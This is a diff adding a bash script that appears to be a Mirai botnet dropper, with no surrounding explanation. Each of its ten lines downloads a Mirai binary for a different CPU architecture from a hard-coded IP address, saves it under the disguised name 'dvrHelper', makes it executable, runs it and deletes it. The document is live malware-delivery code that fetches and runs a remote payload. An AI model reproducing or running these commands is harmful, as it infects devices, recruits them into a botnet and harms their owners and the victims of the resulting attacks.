@@ -1,0 +1,11 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://113.53.235.91/e/mirai.arm -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://113.53.235.91/e/mirai.m68k -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://113.53.235.91/e/mirai.mips -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://113.53.235.91/e/mirai.mpsl -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://113.53.235.91/e/mirai.x86 -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://113.53.235.91/e/mirai.spc -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://113.53.235.91/e/mirai.arm7 -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://113.53.235.91/e/mirai.arm5n -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://113.53.235.91/e/mirai.ppc -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://113.53.235.91/e/mirai.sh4 -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
